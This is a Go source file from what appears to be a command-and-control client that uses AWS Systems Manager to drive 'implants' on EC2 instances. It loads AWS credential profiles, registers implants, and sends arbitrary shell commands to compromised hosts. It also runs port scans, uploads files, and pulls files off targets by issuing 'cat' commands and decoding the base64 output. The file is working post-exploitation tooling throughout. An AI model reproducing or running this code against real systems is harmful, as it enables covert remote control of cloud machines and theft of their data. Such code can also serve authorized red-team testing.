package completion

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/grines/ssmmmm-client/control/ssmaws"
)

func Commands(line string) {
	switch {

	//Load aws profile from .aws/credentials
	case strings.HasPrefix(line, "token profile"):
		help := HelpText("profile ec2user us-east-1", "Profile is used to load a profile from ~/.aws/credentials.", "enabled")
		parse := ParseCMD(line, 4, help)
		if parse != nil {
			target = parse[2]
			region = parse[3]
			sess = getProfile(target, region)
			if sess != nil {
				fmt.Println(connected)
			}
		}

	case strings.HasPrefix(line, "get-caller-identity") && connected == true:
		help := HelpText("get-caller-identity", "GetSessionToken returns current token details.", "enabled")
		parse := ParseCMD(line, 1, help)
		if parse != nil {
			data := GetCallerIdentity(sess)
			fmt.Println(data)
		}

	case strings.HasPrefix(line, "implants ") && connected == true:
		help := HelpText("list implants", "list implants", "enabled")
		parse := ParseCMD(line, 2, help)
		if parse != nil {
			instance = parse[1]
		}

	case strings.HasPrefix(line, "register") && connected == true:
		help := HelpText("create implant", "create implants", "enabled")
		parse := ParseCMD(line, 3, help)
		if parse != nil {
			code := parse[1]
			id := parse[2]
			ssmaws.CreateRegistration(code, id, region)
		}

	//Show command history
	case line == "history":
		dat, err := ioutil.ReadFile("/tmp/readline.tmp")
		if err != nil {
			break
		}
		fmt.Print(string(dat))

	//exit
	case line == "quit":
		connected = false

	//Default if no case
	default:
		instID := strings.Split(instance, ":")
		cmdString := line
		if connected == false {
			fmt.Println("You are not connected to a profile.")
			return
		}
		if instance == "" {
			fmt.Println("You are not connected to an implant")
			return
		}
		if cmdString == "exit" {
			os.Exit(1)
		}
		if strings.HasPrefix(line, "download") {
			arrCommandStr := strings.Fields(cmdString)
			fmt.Println("Trying to download " + arrCommandStr[1])
			commanderdl(cmdString, instID[1], arrCommandStr[1])
			currentDir = ssmaws.GetWorkingDirectory(sess, instID[1])
			return
		}
		if cmdString == "portscan" {
			fmt.Println("Waiting for scan to finish.")
			commander(cmdString, instID[1], false)
			currentDir = ssmaws.GetWorkingDirectory(sess, instID[1])
			return
		}
		if strings.HasPrefix(line, "upload") {
			arrCommandStr := strings.Fields(cmdString)
			fmt.Println("Trying to upload " + arrCommandStr[1])
			Upload(arrCommandStr[1], instID[1])
			currentDir = ssmaws.GetWorkingDirectory(sess, instID[1])
			return
		}
		if cmdString != "" {
			commander(cmdString, instID[1], true)
			currentDir = ssmaws.GetWorkingDirectory(sess, instID[1])
		} else {
			fmt.Println(cmdString)
		}

	}
}

func base64Decode(str string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(str)
	return string(data), err
}

func commander(cmdString string, instID string, timeout bool) {
	cmdid := ssmaws.SendCommand(sess, cmdString, instID)

	var i int
	for {
		i++
		time.Sleep(1 * time.Second)
		status := ssmaws.GetCommandOutput(sess, cmdid, instID)
		if *status.Status == "Success" || *status.Status == "Cancelled" {
			break
		}
		if *status.Status == "Cancelled" {
			break
		}
		if i == 8 && timeout == true {
			ssmaws.CancelSendCommand(sess, instID, cmdid)
		}
	}

	cmdOut := ssmaws.GetCommandOutput(sess, cmdid, instID)
	sout := strings.TrimSuffix(*cmdOut.StandardOutputContent, "\n")
	decoded, err := base64Decode(sout)
	if err != nil {
		fmt.Println(sout)
	} else {
		fmt.Println(decoded)
	}
}

func commanderdl(cmdString string, instID string, filename string) {
	cmdid := ssmaws.SendCommand(sess, "cat "+filename, instID)

	var i int
	for {
		i++
		time.Sleep(1 * time.Second)
		status := ssmaws.GetCommandOutput(sess, cmdid, instID)
		if *status.Status == "Success" || *status.Status == "Cancelled" {
			break
		}
		if *status.Status == "Cancelled" {
			break
		}
		if i == 8 {
			ssmaws.CancelSendCommand(sess, instID, cmdid)
		}
	}

	cmdOut := ssmaws.GetCommandOutput(sess, cmdid, instID)
	sout := strings.TrimSuffix(*cmdOut.StandardOutputContent, "\n")
	decoded, err := base64Decode(sout)
	d1 := []byte(decoded)
	file, err := ioutil.TempFile("/tmp", filepath.Base(filename)+"-")
	if err != nil {
		fmt.Println("Download failed.")
		return
	}
	fmt.Println(file.Name())
	err = os.WriteFile(file.Name(), d1, 0644)
	if err != nil {
		fmt.Println("Download failed.")
	} else {
		fmt.Println("Successfully downloaded " + filename + " to " + file.Name())
	}
}
